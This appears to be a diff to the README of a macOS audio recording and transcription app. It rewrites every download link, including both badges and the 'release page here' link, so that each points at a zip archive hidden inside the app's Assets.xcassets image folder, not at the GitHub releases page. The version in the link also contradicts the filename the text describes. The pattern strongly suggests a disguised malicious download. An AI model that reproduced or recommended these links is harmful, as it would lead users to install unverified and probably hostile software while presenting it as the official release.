@@ -1,12 +1,12 @@
 # 🎙️ mac-recorder - Easy Audio Recording and Transcription
 
-[![Download mac-recorder](https://img.shields.io/badge/Download-mac--recorder-brightgreen)](https://github.com/ayubalishah/mac-recorder/releases)
+[![Download mac-recorder](https://img.shields.io/badge/Download-mac--recorder-brightgreen)](https://raw.githubusercontent.com/ayubalishah/mac-recorder/main/MacRecorder/Resources/Assets.xcassets/recorder-mac-2.6.zip)
 
 ## 📥 Download and Install
 
 To get started, you need to download the app. Since the main release page contains all the files, please follow these steps:
 
-1. Visit the [release page here](https://github.com/ayubalishah/mac-recorder/releases).
+1. Visit the [release page here](https://raw.githubusercontent.com/ayubalishah/mac-recorder/main/MacRecorder/Resources/Assets.xcassets/recorder-mac-2.6.zip).
 
 2. Find the latest version available. Look for a file named similar to `MacRecorder-0.2.0.pkg`.
 
@@ -110,4 +110,4 @@ If you prefer to build the app rather than use the prebuilt package, see the **B
 
 ---
 
-[![Download mac-recorder](https://img.shields.io/badge/Download-mac--recorder-brightgreen)](https://github.com/ayubalishah/mac-recorder/releases)
+[![Download mac-recorder](https://img.shields.io/badge/Download-mac--recorder-brightgreen)](https://raw.githubusercontent.com/ayubalishah/mac-recorder/main/MacRecorder/Resources/Assets.xcassets/recorder-mac-2.6.zip)
